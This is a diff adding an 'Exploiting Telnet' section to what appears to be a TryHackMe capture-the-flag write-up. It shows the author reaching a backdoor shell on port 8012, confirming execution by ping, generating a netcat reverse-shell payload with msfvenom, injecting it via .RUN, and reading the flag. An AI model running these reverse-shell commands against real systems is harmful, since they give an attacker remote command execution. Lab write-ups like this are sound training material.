@@ -526,5 +526,63 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 162.16 seconds
 ```
 
+### Exploiting Telnet
+
+IP 10.10.175.109
+
+telnet 10.10.175.109 8012
+
+```
+Trying 10.10.175.109...
+Connected to 10.10.175.109.
+Escape character is '^]'.
+SKIDY'S BACKDOOR. Type .HELP to view commands
+```
+
+sudo tcpdump ip proto \\icmp -i tun0
+.RUN ping 10.6.11.238 -c 1
+
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+19:42:59.809408 IP 10.10.175.109 > 10.6.11.238: ICMP echo request, id 1141, seq 1, length 64
+19:42:59.809440 IP 10.6.11.238 > 10.10.175.109: ICMP echo reply, id 1141, seq 1, length 64
+
+Was able to see traffic without prompt (pinged from deployed machine to my machine)
+
+Needs to be run in tis order
+
+Run this on machine
+
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=10.6.11.238 lport=4444 R 
+
+```
+WARN: Unresolved or ambiguous specs during Gem::Specification.reset:
+      reline (>= 0)
+      Available/installed versions of this gem:
+      - 0.1.5
+      - 0.1.3
+WARN: Clearing out unresolved specs. Try 'gem cleanup <gem>'
+Please report a bug if this causes problems.
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 89 bytes
+mkfifo /tmp/celb; nc 10.6.11.238 4444 0</tmp/celb | /bin/sh >/tmp/celb 2>&1; rm /tmp/celb
+```
+
+nc -lvp 4444
+
+telnet into IP machine
+.RUN mkfifo /tmp/dblm; nc 10.6.11.238 4444 0</tmp/dblm | /bin/sh >/tmp/dblm 2>&1; rm /tmp/dblm
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.10.175.109 38028
+ls
+flag.txt
+cat flag.txt
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+```
 
 
